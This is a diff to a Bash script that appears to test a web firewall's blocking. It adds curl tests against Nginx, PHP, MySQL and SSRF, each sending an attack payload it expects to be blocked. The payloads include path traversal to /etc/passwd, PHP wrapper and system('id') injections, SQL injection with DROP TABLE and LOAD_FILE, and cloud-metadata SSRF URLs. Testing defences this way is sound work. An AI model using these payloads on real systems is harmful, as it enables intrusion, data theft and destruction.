+    test_curl "Nginx: path traversal double" "block" -A "$UA" -Lk "${URL}/....//....//etc/passwd"
+    test_curl "Nginx: alias traversal" "block" -A "$UA" -Lk "${URL}/static../etc/passwd"
+    test_curl "Nginx: null byte" "block" -A "$UA" -Lk "${URL}/index.php%00.jpg"
+    
+    print_subsection "Buffer Overflow"
+    test_curl "Nginx: URI muito longa (4KB)" "block" -A "$UA" -Lk "${URL}/$(head -c 4000 /dev/zero | tr '\0' 'A')"
+    test_curl "Nginx: URI muito longa (8KB)" "block" -A "$UA" -Lk "${URL}/$(head -c 8000 /dev/zero | tr '\0' 'B')"
+    test_curl "Nginx: muitos headers" "block" -A "$UA" -Lk $(for i in {1..100}; do echo -n "-H 'X-Header-$i: value' "; done) "$URL"
+    
+    print_subsection "Configuração Exposta"
+    test_curl "Nginx: nginx.conf" "block" -A "$UA" -Lk "${URL}/nginx.conf"
+    test_curl "Nginx: /server-status" "block" -A "$UA" -Lk "${URL}/server-status"
+    test_curl "Nginx: /nginx_status" "block" -A "$UA" -Lk "${URL}/nginx_status"
+    test_curl "Nginx: /status" "block" -A "$UA" -Lk "${URL}/status"
+    test_curl "Nginx: /.nginx" "block" -A "$UA" -Lk "${URL}/.nginx"
+    
+    print_subsection "Slowloris e DoS"
+    test_curl "Nginx: header parcial" "block" -A "$UA" -Lk -H "X-Slow: " "$URL"
+    test_curl "Nginx: muitos cookies" "block" -A "$UA" -Lk --cookie "$(for i in {1..200}; do echo -n "c$i=v;"; done)" "$URL"
+    
+    print_subsection "Requests Malformados"
+    test_curl "Nginx: HTTP/0.9" "block" -A "$UA" -Lk --http0.9 "$URL" 2>/dev/null || echo "  [?] HTTP/0.9 não suportado"
+    test_curl "Nginx: duplo // path" "block" -A "$UA" -Lk "${URL}//admin//secret"
+    test_curl "Nginx: backslash path" "block" -A "$UA" -Lk "${URL}/admin\\..\\secret"
+    test_curl "Nginx: CONNECT internal" "block" -A "$UA" -Lk -X CONNECT "${URL}:443"
+    test_curl "Nginx: Host com porta" "block" -A "$UA" -Lk -H "Host: localhost:22" "$URL"
+}
+
+#==============================================================================
+# PHP SPECIFIC ATTACKS (20 testes)
+#==============================================================================
+test_php_attacks() {
+    print_section "🐘 TESTES DE ATAQUES AO PHP (20 testes)"
+    
+    print_subsection "PHP Wrappers e Streams"
+    test_curl "PHP: php://filter base64" "block" -A "$UA" -Lk "${URL}?file=php://filter/convert.base64-encode/resource=index.php"
+    test_curl "PHP: php://input" "block" -A "$UA" -Lk "${URL}?file=php://input" -d "<?php system('id'); ?>"
+    test_curl "PHP: php://stdin" "block" -A "$UA" -Lk "${URL}?file=php://stdin"
+    test_curl "PHP: expect://" "block" -A "$UA" -Lk "${URL}?file=expect://id"
+    test_curl "PHP: data://" "block" -A "$UA" -Lk "${URL}?file=data://text/plain,<?php system('id'); ?>"
+    test_curl "PHP: phar://" "block" -A "$UA" -Lk "${URL}?file=phar://exploit.phar"
+    test_curl "PHP: zip://" "block" -A "$UA" -Lk "${URL}?file=zip://exploit.zip%23shell.php"
+    
+    print_subsection "Deserialization"
+    test_curl "PHP: unserialize O:" "block" -A "$UA" -Lk "${URL}?data=O:8:\"stdClass\":0:{}"
+    test_curl "PHP: unserialize a:" "block" -A "$UA" -Lk "${URL}?data=a:1:{s:4:\"test\";s:4:\"data\";}"
+    test_curl "PHP: serialize gadget" "block" -A "$UA" -Lk -H "Content-Type: application/x-www-form-urlencoded" -d 'data=O:7:"Exploit":1:{s:4:"file";s:11:"/etc/passwd";}' "$URL"
+    
+    print_subsection "Code Injection"
+    test_curl "PHP: eval()" "block" -A "$UA" -Lk "${URL}?code=phpinfo()"
+    test_curl "PHP: assert()" "block" -A "$UA" -Lk "${URL}?code=assert('system(\"id\")')"
+    test_curl "PHP: preg_replace /e" "block" -A "$UA" -Lk "${URL}?pattern=/e&replace=system('id')"
+    test_curl "PHP: create_function" "block" -A "$UA" -Lk "${URL}?func=}system('id');//"
+    test_curl "PHP: backticks" "block" -A "$UA" -Lk "${URL}?cmd=\`id\`"
+    
+    print_subsection "Info Disclosure"
+    test_curl "PHP: phpinfo()" "block" -A "$UA" -Lk "${URL}/phpinfo.php"
+    test_curl "PHP: php-info" "block" -A "$UA" -Lk "${URL}/php-info.php"
+    test_curl "PHP: test.php" "block" -A "$UA" -Lk "${URL}/test.php"
+    test_curl "PHP: info.php" "block" -A "$UA" -Lk "${URL}/info.php"
+    test_curl "PHP: php.ini exposed" "block" -A "$UA" -Lk "${URL}/php.ini"
+}
+
+#==============================================================================
+# DATABASE ATTACKS - MySQL/MariaDB (20 testes)
+#==============================================================================
+test_database_attacks() {
+    print_section "🗄️ TESTES DE ATAQUES A DATABASE (20 testes)"
+    
+    print_subsection "SQL Injection - Clássico"
+    test_curl "DB: OR 1=1" "block" -A "$UA" -Lk "${URL}?id=1' OR '1'='1"
+    test_curl "DB: OR 1=1 comment" "block" -A "$UA" -Lk "${URL}?id=1' OR 1=1--"
+    test_curl "DB: OR 1=1 hash comment" "block" -A "$UA" -Lk "${URL}?id=1' OR 1=1#"
+    test_curl "DB: UNION SELECT" "block" -A "$UA" -Lk "${URL}?id=1' UNION SELECT 1,2,3--"
+    test_curl "DB: UNION ALL SELECT" "block" -A "$UA" -Lk "${URL}?id=1' UNION ALL SELECT 1,user(),database()--"
+    
+    print_subsection "SQL Injection - Time Based"
+    test_curl "DB: SLEEP(5)" "block" -A "$UA" -Lk "${URL}?id=1' AND SLEEP(5)--"
+    test_curl "DB: BENCHMARK" "block" -A "$UA" -Lk "${URL}?id=1' AND BENCHMARK(10000000,SHA1('test'))--"
+    test_curl "DB: WAITFOR DELAY" "block" -A "$UA" -Lk "${URL}?id=1'; WAITFOR DELAY '0:0:5'--"
+    
+    print_subsection "SQL Injection - Out of Band"
+    test_curl "DB: INTO OUTFILE" "block" -A "$UA" -Lk "${URL}?id=1' INTO OUTFILE '/tmp/test.txt'--"
+    test_curl "DB: INTO DUMPFILE" "block" -A "$UA" -Lk "${URL}?id=1' INTO DUMPFILE '/tmp/test.txt'--"
+    test_curl "DB: LOAD_FILE" "block" -A "$UA" -Lk "${URL}?id=1' UNION SELECT LOAD_FILE('/etc/passwd')--"
+    
+    print_subsection "SQL Injection - Stacked Queries"
+    test_curl "DB: DROP TABLE" "block" -A "$UA" -Lk "${URL}?id=1'; DROP TABLE users--"
+    test_curl "DB: DELETE FROM" "block" -A "$UA" -Lk "${URL}?id=1'; DELETE FROM users--"
+    test_curl "DB: UPDATE SET" "block" -A "$UA" -Lk "${URL}?id=1'; UPDATE users SET admin=1--"
+    test_curl "DB: INSERT INTO" "block" -A "$UA" -Lk "${URL}?id=1'; INSERT INTO users VALUES('hacker','pass')--"
+    
+    print_subsection "MySQL/MariaDB Específico"
+    test_curl "DB: @@version" "block" -A "$UA" -Lk "${URL}?id=1' UNION SELECT @@version--"
+    test_curl "DB: INFORMATION_SCHEMA" "block" -A "$UA" -Lk "${URL}?id=1' UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES--"
+    test_curl "DB: HEX encoded" "block" -A "$UA" -Lk "${URL}?id=0x31204f5220313d31"
+    test_curl "DB: CHAR() bypass" "block" -A "$UA" -Lk "${URL}?id=1' AND 1=CHAR(49)--"
+    test_curl "DB: /*!MySQL comment*/" "block" -A "$UA" -Lk "${URL}?id=1'/*!50000UNION*/SELECT 1--"
+}
+
+#==============================================================================
+# SSRF ATTACKS (15 testes)
+#==============================================================================
+test_ssrf_attacks() {
+    print_section "🌐 TESTES DE SSRF - Server Side Request Forgery (15 testes)"
+    
+    print_subsection "Localhost e IPs Internos"
+    test_curl "SSRF: http://localhost" "block" -A "$UA" -Lk "${URL}?url=http://localhost"
+    test_curl "SSRF: http://127.0.0.1" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1"
+    test_curl "SSRF: http://[::1]" "block" -A "$UA" -Lk "${URL}?url=http://[::1]"
+    test_curl "SSRF: http://0.0.0.0" "block" -A "$UA" -Lk "${URL}?url=http://0.0.0.0"
+    test_curl "SSRF: http://192.168.1.1" "block" -A "$UA" -Lk "${URL}?url=http://192.168.1.1"
+    test_curl "SSRF: http://10.0.0.1" "block" -A "$UA" -Lk "${URL}?url=http://10.0.0.1"
+    
+    print_subsection "Cloud Metadata"
+    test_curl "SSRF: AWS metadata" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/latest/meta-data/"
+    test_curl "SSRF: GCP metadata" "block" -A "$UA" -Lk "${URL}?url=http://metadata.google.internal/"
+    test_curl "SSRF: Azure metadata" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/instance"
+    test_curl "SSRF: DigitalOcean" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/v1/"
+    
+    print_subsection "Bypass e Protocolos"
+    test_curl "SSRF: file://" "block" -A "$UA" -Lk "${URL}?url=file:///etc/passwd"
+    test_curl "SSRF: gopher://" "block" -A "$UA" -Lk "${URL}?url=gopher://localhost:25/"
+    test_curl "SSRF: dict://" "block" -A "$UA" -Lk "${URL}?url=dict://localhost:11211/"
+    test_curl "SSRF: 127.0.0.1 decimal" "block" -A "$UA" -Lk "${URL}?url=http://2130706433"
+    test_curl "SSRF: localhost hex" "block" -A "$UA" -Lk "${URL}?url=http://0x7f000001"
 }
 
 #==============================================================================
@@ -606,7 +898,7 @@ case $CATEGORY in
     method) test_all_http_methods ;;
     cookie) test_malicious_cookies ;;
     query) test_malicious_query ;;
-    useragent) test_bad_user_agents; test_good_bots ;;
+    useragent) test_bad_user_agents; test_good_bots; test_fake_bots ;;
     referer) test_bad_referers ;;
     host) test_invalid_host ;;
     uri) test_malicious_uri ;;
@@ -616,6 +908,11 @@ case $CATEGORY in
     xff) test_xff_spoofing ;;
     range) test_range_header ;;
     smuggling) test_http_smuggling ;;
+    fakebots) test_fake_bots ;;
+    nginx) test_nginx_attacks ;;
+    php) test_php_attacks ;;
+    database|db) test_database_attacks ;;
+    ssrf) test_ssrf_attacks ;;
     all)
         test_all_http_methods
         test_malicious_cookies
@@ -628,9 +925,14 @@ case $CATEGORY in
         test_xff_spoofing
         test_range_header
         test_http_smuggling
+        test_nginx_attacks
+        test_php_attacks
+        test_database_attacks
+        test_ssrf_attacks
         test_bad_user_agents
         test_bad_referers
         test_good_bots
+        test_fake_bots
         ;;
     *) echo "Categoria desconhecida: $CATEGORY"; exit 1 ;;
 esac
